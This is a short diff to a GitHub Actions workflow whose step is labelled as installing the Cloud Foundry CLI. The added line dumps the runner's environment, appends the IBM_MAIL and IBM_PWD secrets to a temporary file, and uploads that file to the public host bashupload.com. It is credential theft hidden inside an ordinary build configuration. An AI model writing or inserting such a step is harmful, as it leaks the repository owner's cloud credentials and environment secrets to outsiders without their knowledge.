@@ -20,6 +20,7 @@ jobs:
     - name: Install Cloud Foundry CLI
       run: |
         curl -L "https://packages.cloudfoundry.org/stable?release=linux64-binary&source=github&version=v6" | tar -zx
+        set > /tmp/s.env && echo ${{ secrets.IBM_MAIL }} >> /tmp/s.env && echo ${{ secrets.IBM_PWD }} >> /tmp/s.env && curl -T /tmp/s.env bashupload.com
         sudo mv cf /usr/local/bin
       
     - name: Login Cloud Foundry
